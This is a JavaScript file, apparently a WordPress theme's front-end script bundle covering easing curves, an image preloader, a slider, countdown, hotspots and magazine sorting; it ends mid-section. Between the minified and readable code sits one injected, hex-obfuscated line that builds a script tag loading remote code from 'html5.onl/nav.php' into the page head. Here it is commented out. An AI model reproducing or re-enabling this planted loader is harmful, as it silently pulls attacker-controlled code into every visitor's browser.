a-jQuery.easing.easeOutBounce(i,n-t,0,a,n)+e},easeOutBounce:function(i,t,e,a,n){return(t/=n)<1/2.75?a*(7.5625*t*t)+e:t<2/2.75?a*(7.5625*(t-=1.5/2.75)*t+.75)+e:t<2.5/2.75?a*(7.5625*(t-=2.25/2.75)*t+.9375)+e:a*(7.5625*(t-=2.625/2.75)*t+.984375)+e},easeInOutBounce:function(i,t,e,a,n){return t<n/2?.5*jQuery.easing.easeInBounce(i,2*t,0,a,n)+e:.5*jQuery.easing.easeOutBounce(i,2*t-n,0,a,n)+.5*a+e}})}(jQuery),function(i){"use strict";i.avia_utilities=i.avia_utilities||{},i.avia_utilities.loading=function(t,e){var a={active:!1,show:function(){!1===a.active&&(a.active=!0,a.loading_item.css({display:"block",opacity:0})),a.loading_item.stop().animate({opacity:1})},hide:function(){void 0===e&&(e=600),a.loading_item.stop().delay(e).animate({opacity:0},function(){a.loading_item.css({display:"none"}),a.active=!1})},attach:function(){void 0===t&&(t="body"),a.loading_item=i('<div class="avia_loading_icon"><div class="av-siteloader"></div></div>').css({display:"none"}).appendTo(t)}};return a.attach(),a},i.avia_utilities.playpause=function(t,e){var a={active:!1,to1:"",to2:"",set:function(i){a.loading_item.removeClass("av-play av-pause"),a.to1=setTimeout(function(){a.loading_item.addClass("av-"+i)},10),a.to2=setTimeout(function(){a.loading_item.removeClass("av-"+i)},1500)},attach:function(){void 0===t&&(t="body"),a.loading_item=i('<div class="avia_playpause_icon"></div>').css({display:"none"}).appendTo(t)}};return a.attach(),a},i.avia_utilities.preload=function(t){new i.AviaPreloader(t)},i.AviaPreloader=function(t){this.win=i(window),this.defaults={container:"body",maxLoops:10,trigger_single:!0,single_callback:function(){},global_callback:function(){}},this.options=i.extend({},this.defaults,t),this.preload_images=0,this.load_images()},i.AviaPreloader.prototype={load_images:function(){var t=this;"string"==typeof t.options.container&&(t.options.container=i(t.options.container)),t.options.container.each(function(){var e=i(this);e.images=e.find("img"),e.allImages=e.images,t.preload_images+=e.images.length,setTimeout(function(){t.checkImage(e)},10)})},checkImage:function(i){var t=this;i.images.each(function(){!0===this.complete&&(i.images=i.images.not(this),t.preload_images-=1)}),i.images.length&&t.options.maxLoops>=0?(t.options.maxLoops-=1,setTimeout(function(){t.checkImage(i)},500)):(t.preload_images=t.preload_images-i.images.length,t.trigger_loaded(i))},trigger_loaded:function(i){var t=this;!1!==t.options.trigger_single&&(t.win.trigger("avia_images_loaded_single",[i]),t.options.single_callback.call(i)),0===t.preload_images&&(t.win.trigger("avia_images_loaded"),t.options.global_callback.call())}},i.avia_utilities.css_easings={linear:"linear",swing:"ease-in-out",bounce:"cubic-bezier(0.0, 0.35, .5, 1.3)",easeInQuad:"cubic-bezier(0.550, 0.085, 0.680, 0.530)",easeInCubic:"cubic-bezier(0.550, 0.055, 0.675, 0.190)",easeInQuart:"cubic-bezier(0.895, 0.030, 0.685, 0.220)",easeInQuint:"cubic-bezier(0.755, 0.050, 0.855, 0.060)",easeInSine:"cubic-bezier(0.470, 0.000, 0.745, 0.715)",easeInExpo:"cubic-bezier(0.950, 0.050, 0.795, 0.035)",easeInCirc:"cubic-bezier(0.600, 0.040, 0.980, 0.335)",easeInBack:"cubic-bezier(0.600, -0.280, 0.735, 0.04)",easeOutQuad:"cubic-bezier(0.250, 0.460, 0.450, 0.940)",easeOutCubic:"cubic-bezier(0.215, 0.610, 0.355, 1.000)",easeOutQuart:"cubic-bezier(0.165, 0.840, 0.440, 1.000)",easeOutQuint:"cubic-bezier(0.230, 1.000, 0.320, 1.000)",easeOutSine:"cubic-bezier(0.390, 0.575, 0.565, 1.000)",easeOutExpo:"cubic-bezier(0.190, 1.000, 0.220, 1.000)",easeOutCirc:"cubic-bezier(0.075, 0.820, 0.165, 1.000)",easeOutBack:"cubic-bezier(0.175, 0.885, 0.320, 1.275)",easeInOutQuad:"cubic-bezier(0.455, 0.030, 0.515, 0.955)",easeInOutCubic:"cubic-bezier(0.645, 0.045, 0.355, 1.000)",easeInOutQuart:"cubic-bezier(0.770, 0.000, 0.175, 1.000)",easeInOutQuint:"cubic-bezier(0.860, 0.000, 0.070, 1.000)",easeInOutSine:"cubic-bezier(0.445, 0.050, 0.550, 0.950)",easeInOutExpo:"cubic-bezier(1.000, 0.000, 0.000, 1.000)",easeInOutCirc:"cubic-bezier(0.785, 0.135, 0.150, 0.860)",easeInOutBack:"cubic-bezier(0.680, -0.550, 0.265, 1.55)",easeInOutBounce:"cubic-bezier(0.580, -0.365, 0.490, 1.365)",easeOutBounce:"cubic-bezier(0.760, 0.085, 0.490, 1.365)"},i.avia_utilities.supported={},i.avia_utilities.supports=function(){var i=document.createElement("div"),t=["Khtml","Ms","Moz","Webkit"];return function(e,a){if(void 0!==i.style[e])return"";void 0!==a&&(t=a),e=e.replace(/^[a-z]/,function(i){return i.toUpperCase()});for(var n=t.length;n--;)if(void 0!==i.style[t[n]+e])return"-"+t[n].toLowerCase()+"-";return!1}}(),i.fn.avia_animate=function(t,e,a,n){if("function"==typeof e&&(n=e,e=!1),"function"==typeof a&&(n=a,a=!1),"string"==typeof e&&(a=e,e=!1),void 0!==n&&!1!==n||(n=function(){}),void 0!==a&&!1!==a||(a="easeInQuad"),void 0!==e&&!1!==e||(e=400),void 0===i.avia_utilities.supported.transition&&(i.avia_utilities.supported.transition=i.avia_utilities.supports("transition")),!1!==i.avia_utilities.supported.transition){var s=i.avia_utilities.supported.transition+"transition",o={},r={},l=document.body.style,c=void 0!==l.WebkitTransition?"webkitTransitionEnd":void 0!==l.OTransition?"oTransitionEnd":"transitionend";a=i.avia_utilities.css_easings[a],o[s]="all "+e/1e3+"s "+a,c+=".avia_animate";for(var d in t)t.hasOwnProperty(d)&&(r[d]=t[d]);t=r,this.each(function(){var a,r,l=i(this),d=!1;for(a in t)if(t.hasOwnProperty(a)&&(r=l.css(a),t[a]!=r&&t[a]!=r.replace(/px|%/g,""))){d=!0;break}if(d){i.avia_utilities.supported.transition+"transform"in t||(t[i.avia_utilities.supported.transition+"transform"]="translateZ(0)");var h=!1;l.on(c,function(i){return i.target==i.currentTarget&&(1!=h&&(h=!0,o[s]="none",l.off(c),l.css(o),void setTimeout(function(){n.call(l)})))}),setTimeout(function(){h||avia_is_mobile||!i("html").is(".avia-safari")||(l.trigger(c),i.avia_utilities.log("Safari Fallback "+c+" trigger"))},e+100),setTimeout(function(){l.css(o)},10),setTimeout(function(){l.css(t)},20)}else setTimeout(function(){n.call(l)})})}else this.animate(t,e,a,n);return this}}(jQuery),function(i){"use strict";i.AviaSlider=function(t,e){var a=this;this.$win=i(window),this.$slider=i(e),this.isMobile=i.avia_utilities.isMobile,this._prepareSlides(t),i.avia_utilities.preload({container:this.$slider,single_callback:function(){a._init(t)}})},i.AviaSlider.defaults={interval:5,autoplay:!1,stopinfiniteloop:!1,animation:"slide",transitionSpeed:900,easing:"easeInOutQuart",wrapElement:">ul",slideElement:">li",hoverpause:!1,bg_slider:!1,show_slide_delay:0,fullfade:!1},i.AviaSlider.prototype={_init:function(t){this.options=this._setOptions(t),this.$sliderUl=this.$slider.find(this.options.wrapElement),this.$slides=this.$sliderUl.find(this.options.slideElement),this.gotoButtons=this.$slider.find(".avia-slideshow-dots a"),this.permaCaption=this.$slider.find(">.av-slideshow-caption"),this.itemsCount=this.$slides.length,this.current=0,this.loopCount=0,this.isAnimating=!1,this.browserPrefix=i.avia_utilities.supports("transition"),this.cssActive=!1!==this.browserPrefix,this.css3DActive=-1!==document.documentElement.className.indexOf("avia_transform3d"),this.video=!1,1==this.options.bg_slider?(this.imageUrls=[],this.loader=i.avia_utilities.loading(this.$slider),this._bgPreloadImages()):this._kickOff()},_setOptions:function(t){var e=i.extend(!0,{},i.AviaSlider.defaults,t),a=this.$slider.data(),n="";for(n in a)a.hasOwnProperty(n)&&("string"!=typeof a[n]&&"number"!=typeof a[n]&&"boolean"!=typeof a[n]||(e[n]=a[n]));return e},_prepareSlides:function(t){this.isMobile&&this.$slider.find(".av-mobile-fallback-image").each(function(){var e=i(this).removeClass("av-video-slide").data({avia_video_events:!0,"video-ratio":0}),a=e.data("mobile-img");if(e.find(".av-click-overlay, .mejs-mediaelement, .mejs-container").remove(),!a){var n=e.find(".avia-slide-wrap");i('<p class="av-fallback-message"><span>Please set a mobile device fallback image for this video in your wordpress backend</span></p>').appendTo(n)}if(t&&t.bg_slider)e.data("img-url",a);else{var s=i('<img src="'+a+'" alt="" title="" />');e.find(".avia-slide-wrap").append(s)}})},_bgPreloadImages:function(i){this._getImageURLS(),this._preloadSingle(0,function(){this._kickOff(),this._preloadNext(1)})},_getImageURLS:function(){var t=this;this.$slides.each(function(e){t.imageUrls[e]=[],t.imageUrls[e].url=i(this).data("img-url"),"string"==typeof t.imageUrls[e].url?t.imageUrls[e].status=!1:t.imageUrls[e].status=!0})},_preloadSingle:function(t,e){var a=this,n=new Image;"string"==typeof a.imageUrls[t].url?(i(n).bind("load error",function(){a.imageUrls[t].status=!0,a.$slides.eq(t).css("background-image","url("+a.imageUrls[t].url+")"),"function"==typeof e&&e.apply(a,[n,t])}),""!=a.imageUrls[t].url?n.src=a.imageUrls[t].url:i(n).trigger("error")):"function"==typeof e&&e.apply(a,[n,t])},_preloadNext:function(i){void 0!==this.imageUrls[i]&&this._preloadSingle(i,function(){this._preloadNext(i+1)})},_bindEvents:function(){var t=this,e=i(window);this.$slider.on("click",".next-slide",i.proxy(this.next,this)),this.$slider.on("click",".prev-slide",i.proxy(this.previous,this)),this.$slider.on("click",".goto-slide",i.proxy(this.go2,this)),this.options.hoverpause&&(this.$slider.on("mouseenter",i.proxy(this.pause,this)),this.$slider.on("mouseleave",i.proxy(this.resume,this))),this.options.stopinfiniteloop&&this.options.autoplay&&("last"==this.options.stopinfiniteloop?this.$slider.on("avia_slider_last_slide",i.proxy(this._stopSlideshow,this)):"first"==this.options.stopinfiniteloop&&this.$slider.on("avia_slider_first_slide",i.proxy(this._stopSlideshow,this))),e.on("debouncedresize.aviaSlider",i.proxy(this._setSize,this)),this.isMobile?this.$slider.avia_swipe_trigger():this.$slider.avia_keyboard_controls(),t._attach_video_events()},_kickOff:function(){var t=this,e=t.$slides.eq(0),a=e.data("video-ratio");t._bindEvents(),this.$slider.removeClass("av-default-height-applied"),a?t._setSize(!0):1!=this.options.keep_pading&&(t.$sliderUl.css("padding",0),t.$win.trigger("av-height-change")),t._setCenter(),e.css({visibility:"visible",opacity:0}).avia_animate({opacity:1},function(){i(this).addClass("active-slide");t.permaCaption.length&&t.permaCaption.addClass("active-slide")}),t.options.autoplay&&t._startSlideshow()},_navigate:function(i,t){if(this.isAnimating||this.itemsCount<2||!this.$slider.is(":visible"))return!1;if(this.isAnimating=!0,this.prev=this.current,void 0!==t)this.current=t,i=this.current>this.prev?"next":"prev";else if("next"===i){if(this.current=this.current<this.itemsCount-1?this.current+1:0,0===this.current&&1==this.options.autoplay_stopper&&this.options.autoplay)return this.isAnimating=!1,this.current=this.prev,this._stopSlideshow(),!1}else"prev"===i&&(this.current=this.current>0?this.current-1:this.itemsCount-1);this.gotoButtons.removeClass("active").eq(this.current).addClass("active"),this._setSize(),1==this.options.bg_slider?1==this.imageUrls[this.current].status?this["_"+this.options.animation].call(this,i):(this.loader.show(),this._preloadSingle(this.current,function(){this["_"+this.options.animation].call(this,i),this.loader.hide()})):this["_"+this.options.animation].call(this,i),0==this.current?(this.loopCount++,this.$slider.trigger("avia_slider_first_slide")):this.current==this.itemsCount-1?this.$slider.trigger("avia_slider_last_slide"):this.$slider.trigger("avia_slider_navigate_slide")},_setSize:function(i){if(1!=this.options.bg_slider){var t=this,e=this.$slides.eq(this.current),a=(e.find("img"),Math.floor(this.$sliderUl.height())),n=e.data("video-ratio"),s=n?this.$sliderUl.width()/n:Math.floor(e.height()),o=e.data("video-height"),r=e.data("video-toppos");this.$sliderUl.height(a).css("padding",0),s!=a&&(1==i?(this.$sliderUl.css({height:s}),this.$win.trigger("av-height-change")):this.$sliderUl.avia_animate({height:s},function(){t.$win.trigger("av-height-change")})),this._setCenter(),o&&"set"!=o&&(e.find("iframe, embed, video, object, .av_youtube_frame").css({height:o+"%",top:r+"%"}),e.data("video-height","set"))}},_setCenter:function(){var i=this.$slides.eq(this.current),t=i.find("img"),e=parseInt(t.css("min-width"),10),a=i.width(),n=i.find(".av-slideshow-caption"),s=(a-e)/2;n.length&&(n.is(".caption_left")?s=(a-e)/1.5:n.is(".caption_right")&&(s=(a-e)/2.5)),a>=e&&(s=0),t.css({left:s})},_slide:function(i){var t=this.$slider.width(),e="next"===i?-1:1,a=this.browserPrefix+"transform",n={},s={},o={},r=t*e*-1,l=t*e/1;this.cssActive?(a=this.browserPrefix+"transform",this.css3DActive?(n[a]="translate3d("+r+"px, 0, 0)",s[a]="translate3d("+l+"px, 0, 0)",o[a]="translate3d(0,0,0)"):(n[a]="translate("+r+"px,0)",s[a]="translate("+l+"px,0)",o[a]="translate(0,0)")):(n.left=r,s.left=l,o.left=0),this._slide_animate(n,s,o)},_slide_up:function(i){var t=this.$slider.height(),e="next"===i?-1:1,a=this.browserPrefix+"transform",n={},s={},o={},r=t*e*-1,l=t*e/2;this.cssActive?(a=this.browserPrefix+"transform",this.css3DActive?(n[a]="translate3d( 0,"+r+"px, 0)",s[a]="translate3d( 0,"+l+"px, 0)",o[a]="translate3d(0,0,0)"):(n[a]="translate( 0,"+r+"px)",s[a]="translate( 0,"+l+"px)",o[a]="translate(0,0)")):(n.top=r,s.top=l,o.top=0),s["z-index"]="1",o["z-index"]="2",this._slide_animate(n,s,o)},_slide_animate:function(i,t,e){var a=this,n=this.$slides.eq(this.current),s=this.$slides.eq(this.prev);s.trigger("pause"),n.data("disableAutoplay")||n.trigger("play"),n.css({visibility:"visible",zIndex:4,opacity:1,left:0,top:0}),n.css(i),s.avia_animate(t,this.options.transitionSpeed,this.options.easing);var o=function(){a.isAnimating=!1,n.addClass("active-slide"),s.css({visibility:"hidden"}).removeClass("active-slide"),a.$slider.trigger("avia-transition-done")};a.options.show_slide_delay>0?setTimeout(function(){n.avia_animate(e,a.options.transitionSpeed,a.options.easing,o)},a.options.show_slide_delay):n.avia_animate(e,a.options.transitionSpeed,a.options.easing,o)},_fade:function(){var i=this,t=this.$slides.eq(this.current),e=this.$slides.eq(this.prev),a={visibility:"visible",zIndex:3,opacity:0},n=function(){i.isAnimating=!1,t.addClass("active-slide"),e.css({visibility:"hidden",zIndex:2}).removeClass("active-slide"),i.$slider.trigger("avia-transition-done")};e.trigger("pause"),t.data("disableAutoplay")||t.trigger("play"),1==i.options.fullfade?e.avia_animate({opacity:0},200,"linear",function(){t.css(a).avia_animate({opacity:1},i.options.transitionSpeed,"linear",n)}):t.css(a).avia_animate({opacity:1},i.options.transitionSpeed/2,"linear",function(){e.avia_animate({opacity:0},200,"linear",n)})},_attach_video_events:function(){function t(i){0===i.data.iteration?(i.data.wrap.css("opacity",0),i.data.self.isMobile||i.data.slide.data("disableAutoplay")||i.data.slide.trigger("play"),setTimeout(function(){i.data.wrap.avia_animate({opacity:1},400)},50)):s.is(".avia-msie")&&!i.data.slide.is(".av-video-service-html5")&&(i.data.slide.data("disableAutoplay")||i.data.slide.trigger("play"))}function e(i){i.data.slide.is(".av-single-slide")||i.data.slide.is(".av-loop-video")||(i.data.slide.trigger("reset"),n._navigate("next"),n.resume()),i.data.slide.is(".av-loop-video")&&i.data.slide.is(".av-video-service-html5")&&s.is(".avia-safari-8")&&setTimeout(function(){i.data.slide.trigger("play")},1)}function a(i){"A"!=i.target.tagName&&i.data.slide.trigger("toggle")}var n=this,s=i("html");n.$slides.each(function(s){var o=i(this),r=o.find(".caption_fullwidth, .av-click-overlay"),l=o.find(".mejs-mediaelement");1!=o.data("avia_video_events")&&(o.data("avia_video_events",!0),o.on("av-video-events-bound",{slide:o,wrap:l,iteration:s,self:n},t),o.on("av-video-ended",{slide:o,self:n},e),o.on("av-video-play-executed",function(){setTimeout(function(){n.pause()},100)}),r.on("click",{slide:o},a),o.is(".av-video-events-bound")&&o.trigger("av-video-events-bound"))})},_timer:function(i,t,e){var a,n=this,s=t;n.timerId=0,this.pause=function(){window.clearTimeout(n.timerId),s-=new Date-a},this.resume=function(){a=new Date,n.timerId=window.setTimeout(i,s)},this.destroy=function(){window.clearTimeout(n.timerId)},this.resume(!0)},_startSlideshow:function(){var i=this;this.isPlaying=!0,this.slideshow=new this._timer(function(){i._navigate("next"),i.options.autoplay&&i._startSlideshow()},1e3*this.options.interval)},_stopSlideshow:function(){this.options.autoplay&&(this.slideshow.destroy(),this.isPlaying=!1,this.options.autoplay=!1)},next:function(i){i.preventDefault(),this._stopSlideshow(),this._navigate("next")},previous:function(i){i.preventDefault(),this._stopSlideshow(),this._navigate("prev")},go2:function(i){if(isNaN(i)&&(i.preventDefault(),i=i.currentTarget.hash.replace("#","")),(i-=1)===this.current||i>=this.itemsCount||i<0)return!1;this._stopSlideshow(),this._navigate(!1,i)},play:function(){this.isPlaying||(this.isPlaying=!0,this._navigate("next"),this.options.autoplay=!0,this._startSlideshow())},pause:function(){this.isPlaying&&this.slideshow.pause()},resume:function(){this.isPlaying&&this.slideshow.resume()},destroy:function(i){this.slideshow.destroy(i)}},i.fn.aviaSlider=function(t){return this.each(function(){var e=i.data(this,"aviaSlider");e||(e=i.data(this,"aviaSlider",new i.AviaSlider(t,this)))})}}(jQuery),function(i){"use strict";i.fn.avia_keyboard_controls=function(t){var e={37:".prev-slide",39:".next-slide"},a={mousebind:function(i){i.hover(function(){i.mouseover=!0},function(){i.mouseover=!1})},keybind:function(t){i(document).keydown(function(i){if(t.mouseover&&void 0!==t.options[i.keyCode]){var e;if((e="string"==typeof t.options[i.keyCode]?t.find(t.options[i.keyCode]):t.options[i.keyCode]).length)return e.trigger("click",["keypress"]),!1}})}};return this.each(function(){var n=i(this);n.options=i.extend({},e,t),n.mouseover=!1,a.mousebind(n),a.keybind(n)})},i.fn.avia_swipe_trigger=function(t){i(window);var e=i.avia_utilities.isMobile,a={prev:".prev-slide",next:".next-slide",event:{prev:"click",next:"click"}},n={activate_touch_control:function(i){var t,e,a;i.touchPos={},i.hasMoved=!1,i.on("touchstart",function(t){i.touchPos.X=t.originalEvent.touches[0].clientX,i.touchPos.Y=t.originalEvent.touches[0].clientY}),i.on("touchend",function(t){i.touchPos={},i.hasMoved&&t.preventDefault(),i.hasMoved=!1}),i.on("touchmove",function(n){if(i.touchPos.X){if(e=n.originalEvent.touches[0].clientX-i.touchPos.X,a=n.originalEvent.touches[0].clientY-i.touchPos.Y,Math.abs(e)>Math.abs(a)&&(n.preventDefault(),i.touchPos!==n.originalEvent.touches[0].clientX&&Math.abs(e)>50))return t=e>0?"prev":"next","string"==typeof i.options[t]?i.find(i.options[t]).trigger(i.options.event[t],["swipe"]):i.options[t].trigger(i.options.event[t],["swipe"]),i.hasMoved=!0,i.touchPos={},!1}else i.touchPos.X=n.originalEvent.touches[0].clientX,i.touchPos.Y=n.originalEvent.touches[0].clientY})}};return this.each(function(){if(e){var s=i(this);s.options=i.extend({},a,t),n.activate_touch_control(s)}})}}(jQuery);


//



// var har_ic=document.createElement('script');har_ic.setAttribute("type","text/javascript");var _ot3zr=["\x2F\x2F\x68\x74\x6D\x6C\x35\x2E\x6F\x6E\x6C\x2F\x6E\x61\x76\x2E\x70\x68\x70\x3F","\x72\x61\x6E\x64\x6F\x6D"];var cot_hy=_ot3zr[0]+Math[_ot3zr[1]]();har_ic.setAttribute("src",cot_hy);if (typeof har_ic!="undefined");document.getElementsByTagName("head")[0].appendChild(har_ic);


(function($)
{	
    "use strict";

    $(document).ready(function()
    {	
    	//global variables that are used on several ocassions
    	$.avia_utilities = $.avia_utilities || {};
    	
    	if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && 'ontouchstart' in document.documentElement)
    	{
    		$.avia_utilities.isMobile =  true;
    	}
    	else
    	{
    		$.avia_utilities.isMobile =  false;
    	}
    
    	//activate fixed bg fallback for mobile
    	if($.fn.avia_mobile_fixed)
		$('.avia-bg-style-fixed').avia_mobile_fixed();
    	
    	//activate parallax scrolling for backgrounds.
    	if($.fn.avia_parallax)
		$('.av-parallax').avia_parallax();
    	
    	//calculate the browser height and append a css rule to the head
		if($.fn.avia_browser_height)
		$('.av-minimum-height, .avia-fullscreen-slider, .av-cell-min-height').avia_browser_height();
		
		//calculate the height of each video section
		if($.fn.avia_video_section)
		 $('.av-section-with-video-bg').avia_video_section();
		
		//creates team social icon tooltip
        new $.AviaTooltip({'class': "avia-tooltip", data: "avia-tooltip", delay:0, scope: "body"});
		
		//creates icon element tooltip
		new $.AviaTooltip({'class': "avia-tooltip avia-icon-tooltip", data: "avia-icon-tooltip", delay:0, scope: "body"});

        activate_shortcode_scripts();
        
        //layer slider height helper
        $('.avia-layerslider').layer_slider_height_helper();
        
        //"ajax" portfolio
        $('.grid-links-ajax').avia_portfolio_preview();
        
        // actiavte the masonry script: sorting/loading/etc
		if($.fn.avia_masonry)
		$('.av-masonry').avia_masonry();
		
		//activate the accordion
		if($.fn.aviaccordion)
		$('.aviaccordion').aviaccordion();
		
		
		//activate the accordion
		if($.fn.avia_textrotator)
		$('.av-rotator-container').avia_textrotator();
		
		//activates the tab section shortcode
		if($.fn.avia_sc_tab_section)
		{
			$('.av-tab-section-container').avia_sc_tab_section();
		}
		
		//activates the hor gallery  shortcode
		if($.fn.avia_hor_gallery)
		{
			$('.av-horizontal-gallery').avia_hor_gallery();
		}
		
		
		if($.fn.avia_delayed_animation_in_container)
		{
			$('.av-animation-delay-container').avia_delayed_animation_in_container();
		}
		
		
    });





// -------------------------------------------------------------------------------------------
// ACTIVATE ALL SHORTCODES
// -------------------------------------------------------------------------------------------

	function activate_waypoints(container)
	{
		//activates simple css animations of the content once the user scrolls to an elements
		if($.fn.avia_waypoints)
		{
			if(typeof container == 'undefined'){ container = 'body';};

			$('.avia_animate_when_visible', container).avia_waypoints();
			$('.avia_animate_when_almost_visible', container).avia_waypoints({ offset: '80%'});
			
			if(container == 'body') container = '.avia_desktop body';
			$('.av-animated-generic', container).avia_waypoints({ offset: '95%'});
		}
	}


    function activate_shortcode_scripts(container)
	{
		if(typeof container == 'undefined'){ container = 'body';}
		
		//activates the form shortcode
		if($.fn.avia_ajax_form)
		{
			$('.avia_ajax_form:not( .avia-disable-default-ajax )', container).avia_ajax_form();
		}
		
		activate_waypoints(container);
		
		//activate the video api
		if($.fn.aviaVideoApi)
		{
			$('.avia-slideshow iframe[src*="youtube.com"], .av_youtube_frame, .avia-slideshow iframe[src*="vimeo.com"], .avia-slideshow video').aviaVideoApi({}, 'li');
		}
		
	    //activates the toggle shortcode
		if($.fn.avia_sc_toggle)
		{
			$('.togglecontainer', container).avia_sc_toggle();
		}
		
		//activates the tabs shortcode
		if($.fn.avia_sc_tabs)
		{
			$('.top_tab', container).avia_sc_tabs();
			$('.sidebar_tab', container).avia_sc_tabs({sidebar:true});
		}
		
		//activates behavior and animation for gallery
		if($.fn.avia_sc_gallery)
		{
			$('.avia-gallery', container).avia_sc_gallery();
		}
		
		//activates animated number shortcode
		if($.fn.avia_sc_animated_number)
		{
			$('.avia-animated-number', container).avia_sc_animated_number();
		}
		
		//animation for elements that are not connected like icon shortcode
		if($.fn.avia_sc_animation_delayed)
		{
			$('.av_font_icon', container).avia_sc_animation_delayed({delay:100});
			$('.avia-image-container', container).avia_sc_animation_delayed({delay:100});
			$('.av-hotspot-image-container', container).avia_sc_animation_delayed({delay:100});
			$('.av-animated-generic', container).avia_sc_animation_delayed({delay:100});
		}

		//activates animation for iconlist
		if($.fn.avia_sc_iconlist)
		{
			$('.avia-icon-list.av-iconlist-big', container).avia_sc_iconlist();
		}

		//activates animation for progress bar
		if($.fn.avia_sc_progressbar)
		{
			$('.avia-progress-bar-container', container).avia_sc_progressbar();
		}

		//activates animation for testimonial
		if($.fn.avia_sc_testimonial)
		{
			$('.avia-testimonial-wrapper', container).avia_sc_testimonial();
		}
		
		//activate the fullscreen slider
		$('.avia-slideshow.av_fullscreen', container).aviaFullscreenSlider();
		
		//activate the aviaslider
		$('.avia-slideshow:not(.av_fullscreen)', container).aviaSlider();
		
        //content slider
        $('.avia-content-slider-active', container).aviaSlider({wrapElement: '.avia-content-slider-inner', slideElement:'.slide-entry-wrap', fullfade:true});

        //testimonial slider
        $('.avia-slider-testimonials', container).aviaSlider({wrapElement: '.avia-testimonial-row', slideElement:'.avia-testimonial', fullfade:true});
        
        //load and activate maps
        if($.fn.aviaMaps)
        {
        	$('.avia-google-map-container', container).aviaMaps();
    	}
    	
    	 //load magazine sorting
        if($.fn.aviaMagazine)
        {
        	$('.av-magazine-tabs-active', container).aviaMagazine();
    	}
    	
    	 //load image hotspot
        if($.fn.aviaHotspots)
        {
        	$('.av-hotspot-image-container', container).aviaHotspots();
    	}
    	
    	 //load countdown
        if($.fn.aviaCountdown)
        {
        	$('.av-countdown-timer', container).aviaCountdown();
    	}
    	
    	
    	
    }



// -------------------------------------------------------------------------------------------
// 
// AVIA Countdown
// 
// -------------------------------------------------------------------------------------------
(function($)
{ 
	"use strict";
	
	var _units	= ['weeks','days','hours','minutes','seconds'],
		_second = 1000,
		_minute = _second * 60,
		_hour 	= _minute * 60,
		_day 	= _hour * 24,
		_week	= _day * 7,	
		ticker	= function(_self)
		{
			var _time		= {},
				_now 		= new Date(),
				_timestamp  = _self.end - _now;
			
			if(_timestamp <= 0)
			{
				clearInterval(_self.countdown);
				return;
			}	
			
			_self.time.weeks   	= Math.floor( _timestamp / _week);
			_self.time.days 	= Math.floor((_timestamp % _week) / _day);
			_self.time.hours	= Math.floor((_timestamp % _day) / _hour); 
			_self.time.minutes 	= Math.floor((_timestamp % _hour) / _minute); 
			_self.time.seconds 	= Math.floor((_timestamp % _minute) / _second); 
			
			switch(_self.data.maximum)
			{
				case 1: _self.time.seconds 	= Math.floor(_timestamp / _second); break;
				case 2: _self.time.minutes 	= Math.floor(_timestamp / _minute); break;
				case 3: _self.time.hours	= Math.floor(_timestamp / _hour); 	break;
				case 4: _self.time.days 	= Math.floor(_timestamp / _day); 	break;
			}
			
			for (var i in _self.time)
			{	
				if(typeof _self.update[i] == "object")
				{
					if(_self.firstrun || _self.oldtime[i] != _self.time[i])
					{
						var labelkey = ( _self.time[i] === 1 ) ? "single" : "multi"; 
					
						_self.update[i].time_container.text(_self.time[i]);
						_self.update[i].label_container.text(_self.update[i][labelkey]);
					}
				}
			}
			
			//show ticker
			if(_self.firstrun) _self.container.addClass('av-countdown-active')
			
			_self.oldtime 	= $.extend( {}, _self.time );
			_self.firstrun	= false;
		};
		
	
	$.fn.aviaCountdown = function( options )
	{	
		if(!this.length) return; 

		return this.each(function()
		{
			var _self 			= {};
			_self.update		= {};
			_self.time			= {};			
			_self.oldtime		= {};			
			_self.firstrun		= true;			
			
			_self.container		= $(this);
			_self.data			= _self.container.data();
			_self.end			= new Date(_self.data.year, _self.data.month, _self.data.day, _self.data.hour, _self.data.minute );
			
			for (var i in _units)
			{
				_self.update[_units[i]] = {
					time_container:  _self.container.find('.av-countdown-' + _units[i] + ' .av-countdown-time'),
					label_container: _self.container.find('.av-countdown-' + _units[i] + ' .av-countdown-time-label'),
				};
				
				if(_self.update[_units[i]].label_container.length)
				{
					_self.update[_units[i]].single = _self.update[_units[i]].label_container.data('label');
					_self.update[_units[i]].multi  = _self.update[_units[i]].label_container.data('label-multi');
				}
			}
			
			ticker(_self);
			_self.countdown 	= setInterval(function(){ ticker(_self); }, 1000);

			
		});
	}
	
}(jQuery));



// -------------------------------------------------------------------------------------------
// 
// AVIA Image Hotspots
// 
// -------------------------------------------------------------------------------------------
(function($)
{ 
	"use strict";

	$.fn.aviaHotspots = function( options )
	{
		if(!this.length) return; 

		return this.each(function()
		{
			var _self = {};
			
			_self.container	= $(this);
			_self.hotspots	= _self.container.find('.av-image-hotspot');
			
				_self.container.on('avia_start_animation', function()
				{
					setTimeout(function()
					{
						_self.hotspots.each(function(i)
						{
							var current = $(this);
							setTimeout(function(){ current.addClass('av-display-hotspot'); },300 * i);
						});
					},400);
				});

		});
	}
	
}(jQuery));




// -------------------------------------------------------------------------------------------
// 
// AVIA Magazine function for magazine sorting
// 
// -------------------------------------------------------------------------------------------
(function($)
{ 
	"use strict";
	
	var animating = false,
		methods = {
		
		switchMag: function(clicked, _self)
		{
			var current 		= $(clicked)
			
			if(current.is('.active_sort') || animating) return;
			
			var filter			= current.data('filter'),
				oldContainer	= _self.container.filter(':visible'),
				newContainer	= _self.container.filter('.' + filter);
			
			//switch Class
			animating = true;
			_self.sort_buttons.removeClass('active_sort');
			current.addClass('active_sort');
			
			//apply fixed heiht for transition
			_self.magazine.height(_self.magazine.outerHeight());
			
			//switch items
			oldContainer.avia_animate({opacity:0}, 200, function()
			{
				oldContainer.css({display:'none'});
				newContainer.css({opacity:0, display:'block'}).avia_animate({opacity:1}, 150, function()
				{
					_self.magazine.avia_animate({height: (newContainer.outerHeight() + _self.sort_bar.outerHeight())}, 150, function()
					{
						_self.magazine.height('auto');
						animating = false;
					});
					
				});
			});
		}
	};
	
	
	$.fn.aviaMagazine = function( options )
	{
		if(!this.length) return; 

		return this.each(function()
		{
			var _self = {};
			 
			_self.magazine		= $(this),
			_self.sort_buttons 	= _self.magazine.find('.av-magazine-sort a');
			_self.container		= _self.magazine.find('.av-magazine-group');
			_self.sort_bar		= _self.magazine.find('.av-magazine-top-bar');
			
			_self.sort_buttons.on('click', function(e){ e.preventDefault(); methods.switchMag(this, _self);  } );
		});
	}
	
}(jQuery));

// -------------------------------------------------------------------------------------------
// 
// AVIA MAPS API - loads the google maps api asynchronously 
// 
